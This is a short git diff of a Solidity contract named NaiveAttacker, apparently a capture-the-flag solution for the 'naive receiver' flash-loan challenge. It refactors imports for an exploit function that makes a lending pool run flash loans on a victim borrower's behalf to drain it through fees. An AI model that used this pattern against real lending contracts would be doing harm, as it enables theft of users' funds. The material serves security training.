@@ -1,10 +1,13 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
+import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+import "../naive-receiver/NaiveReceiverLenderPool.sol";
+
 contract NaiveAttacker {
     function exploit(
-        INaiveReceiverLenderPool pool, 
-        address borrower, 
+        NaiveReceiverLenderPool pool, 
+        IERC3156FlashBorrower borrower, 
         address token,
         uint256 borrowAmount
     ) external {
@@ -12,8 +15,4 @@ contract NaiveAttacker {
             pool.flashLoan(borrower, token, borrowAmount, "");
         }
     }
-}
-
-interface INaiveReceiverLenderPool {
-    function flashLoan(address borrower, address token, uint256 borrowAmount, bytes calldata data) external;
 }
